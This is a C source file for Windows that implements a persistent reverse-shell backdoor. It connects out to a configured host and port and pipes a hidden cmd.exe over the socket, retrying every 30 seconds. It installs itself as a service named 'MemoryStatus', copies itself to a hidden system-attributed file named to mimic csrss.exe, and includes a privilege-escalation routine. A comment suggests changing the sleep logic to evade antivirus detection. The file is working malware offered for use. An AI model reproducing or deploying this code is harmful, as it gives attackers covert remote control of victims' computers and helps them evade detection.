#include <stdio.h>
#include<WinSock2.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#pragma comment(lib, "ws2_32.lib")
int WINAPI MessageBox(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType);
void WINAPI BDHandler(DWORD dwControl);
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
char const address[] = "12345678987654321";
char const port[] = "999999999";
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;


int WriteToLog(char* str)
{
    FILE* log;
    log = fopen("C:\\1.TXT", "a+");
    if (log == NULL)
    return -1;
    fprintf(log, "%s\n", str);
    fclose(log);
    return 0;
}
void BackDoor(){
    WSADATA WSAData;
    SOCKET sock; 

    SOCKADDR_IN addr_in;
    char Buff[1024]; 

    int ret;
    WSAStartup(MAKEWORD(2,2),&WSAData); 

    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(atoi(port)); 
    addr_in.sin_addr.S_un.S_addr=inet_addr(address);
 
    sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    
    if (WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR) {
        return;
    }
    
    
    SECURITY_ATTRIBUTES pipeattr1,pipeattr2; 
    HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2; 
    pipeattr1.nLength=12; 
    pipeattr1.lpSecurityDescriptor=0; 
    pipeattr1.bInheritHandle=TRUE; 
    CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0); 
    pipeattr2.nLength=12; 
    pipeattr2.lpSecurityDescriptor=0; 
    pipeattr2.bInheritHandle=TRUE; 
    CreatePipe(&hReadPipe2,&hWritePipe2,&pipeattr2,0); 
    STARTUPINFO si; 
    ZeroMemory(&si,sizeof(si)); 
    si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
    si.wShowWindow=SW_HIDE; 
    si.hStdInput=hReadPipe2; 
    si.hStdOutput=si.hStdError=hWritePipe1; 
    char cmdline[]="cmd.exe"; 
    PROCESS_INFORMATION ProcessInformation; 
    ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation); 

    unsigned long lBytesRead; 
    while (1) 
    { 
        
        ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0); 
        if (lBytesRead) 
        { 
            
            ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0); 
            if (!ret) break; 
            ret=send(sock,Buff+'\0',lBytesRead,0); 
            if (ret<=0) break; 
        } else { 
            lBytesRead=recv(sock,Buff,1024,0); 
            if (lBytesRead<=0) break; 
            ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0); 
            if (!ret) break; 
            if (ret<=0)break;
            Sleep(600);
        }
    }
    
}

//提升进程权限
void AdvanceProcess(){
    HANDLE hdlTokenHandle;
    HANDLE hdlProcessHandle = GetCurrentProcess();
    LUID tmpLuid;
    TOKEN_PRIVILEGES tkp;
    TOKEN_PRIVILEGES tkpNewButIgnored;
    if(!OpenProcessToken(hdlProcessHandle,TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hdlTokenHandle)){
        CloseHandle(hdlTokenHandle);
        return;
    }
    if (!LookupPrivilegeValueA("",SE_DEBUG_NAME,&tmpLuid)){
        CloseHandle(hdlTokenHandle);
        return;
    }
    tkp.PrivilegeCount=1;
    tkp.Privileges[0].Luid = tmpLuid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hdlTokenHandle, FALSE, &tkp, sizeof(tkp), NULL, NULL))
    {  
        CloseHandle(hdlTokenHandle);  
        return ;  
    } 

}

void Init(){
    // printf("\nINIT START.");
    
    //here to go!
    CreateEventA(0,FALSE,FALSE,"MemoryStatus");
    while(1){
        
        Sleep(1000*30);
        BackDoor();
        //这里可以把Sleep替换成其他检测方式已绕过杀软检测
    }
}

void WINAPI ServiceMain(DWORD dwArgc,  LPTSTR* lpszArgv){
    DWORD dwThreadId;
    // WriteToLog("Running..");
    if (!(ServiceStatusHandle = RegisterServiceCtrlHandler("MemoryStatus",
                     BDHandler))) return;
    ServiceStatus.dwServiceType  = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState  = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted  = SERVICE_ACCEPT_STOP
                      | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwWin32ExitCode        = 0;
    ServiceStatus.dwCheckPoint            = 0;
    ServiceStatus.dwWaitHint              = 0;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwCheckPoint   = 0;
    ServiceStatus.dwWaitHint     = 0;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    Init();
}


void WINAPI BDHandler(DWORD dwControl)
{
 switch(dwControl)
 {
    case SERVICE_CONTROL_STOP:
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
    default:
        break;
 }
}

int _stdcall WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
)
{
    char  szPath[MAX_PATH];
    char  target[MAX_PATH] = "c:\\";
    char  tar_path[MAX_PATH];
    char  Direectory[MAX_PATH];
    char  cmd[255];
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (OpenEventA(2031619,FALSE,"MemoryStatus") != 0 ){
        return 1;
    }
    // AdvanceProcess();
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = (char*)"MemoryStatus";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    StartServiceCtrlDispatcher(ServiceTable); 
    // if ( !GetEnvironmentVariable("WINDIR", (LPSTR)target, MAX_PATH) ) return 1;
    
    if( !GetModuleFileName( NULL, (LPSTR)szPath, MAX_PATH ) ) return 1;
    if(!GetCurrentDirectory(MAX_PATH,Direectory)) return 1;
    // printf("Direectory:%s\nszPath:%s\ntarget:%s\n",Direectory,szPath,target);
    if (strcmp(Direectory,target) != 0 ){
        //判断是否在windows目录下
        strcat(target,"\\csrse.exe");
        // printf(target);
        CopyFile(szPath,target,TRUE);
        sprintf(cmd,"sc create MemoryStatus binPath= %s",target);
        // ShellExecuteA(NULL,"open","sc.exe",cmd,"",SW_HIDE);
        // ShellExecuteA(NULL,"open","sc.exe","start MemoryStatus","",SW_HIDE);
        system(cmd);
        sprintf(cmd,"attrib +s +a +h +r %s",target);
        system(cmd);
        system("sc start MemoryStatus");
        exit(0);
        return 0;
     }
    // printf("\nRun");
    Init();
     
    return 0;
}
